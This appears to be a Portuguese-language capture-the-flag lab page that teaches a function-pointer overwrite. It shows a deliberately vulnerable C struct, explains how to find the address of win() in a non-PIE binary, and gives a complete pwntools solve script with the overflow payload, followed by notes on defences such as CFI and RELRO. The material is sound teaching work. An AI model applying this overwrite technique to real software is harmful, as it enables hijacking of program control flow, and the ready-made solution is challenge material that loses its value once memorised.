# Corrupcao de memoria: ponteiro de funcao

Segunda primitiva. Agora a variavel vizinha nao e um numero: e um **ponteiro de
funcao** que o programa vai chamar. Se voce sobrescreve-lo, voce escolhe qual
funcao sera executada - um primeiro passo em direcao a controlar o fluxo.

## O programa vulneravel

`/challenge/vuln.c`:

```c
struct handlers {
    char buf[32];
    void (*handler)(void);   /* logo depois de buf */
    char tail[64];
};
...
st.handler = safe;           /* valor normal */
memcpy(st.buf, data, n);     /* copia pelo tamanho do arquivo -> estoura */
st.handler();                /* chama o ponteiro, agora controlado por voce */
```

Existe uma funcao `win()` que imprime `FUNC_PTR_OK`. Seu objetivo e fazer
`st.handler` apontar para `win()`.

## Descobrindo o endereco de win()

O programa e compilado com `-no-pie`, entao os enderecos das funcoes sao **fixos**.
Voce pode descobrir o endereco de `win()` de duas formas:

1. Compilar o mesmo fonte e ler o simbolo:

```bash
gcc -O0 -fno-stack-protector -no-pie /challenge/vuln.c -o /tmp/v
nm /tmp/v | grep ' win'
objdump -d /tmp/v | grep '<win>:'
```

2. O proprio programa imprime uma dica em stderr: `[dica] win = 0x...`.

Como `-no-pie` torna o endereco deterministico, o binario que o `check` compila
tem o mesmo endereco do que voce compilou.

## O que voce precisa fazer

```python
from pwn import p64, ELF, context
import subprocess

# Compila o mesmo fonte para ler o endereco de win() de forma confiavel.
subprocess.run(
    ["gcc", "-O0", "-fno-stack-protector", "-no-pie",
     "/challenge/vuln.c", "-o", "/tmp/vuln_solve"],
    check=True,
)
elf = ELF("/tmp/vuln_solve")
win = elf.symbols["win"]

payload  = b"A" * 32     # enche buf[32]
payload += p64(win)      # sobrescreve o ponteiro handler
open("/home/hacker/payload.bin", "wb").write(payload)
```

## Fluxo completo

```bash
python3 /home/hacker/solve.py
/challenge/check
```

## Por que isto importa

Ponteiros de funcao corrompidos (vtables de C++, callbacks, GOT) sao um alvo
classico de exploracao. A defesa envolve layout de memoria, CFI (Control Flow
Integrity), RELRO para a GOT e canaries. Aqui, com as protecoes desligadas, a
sobrescrita e direta.
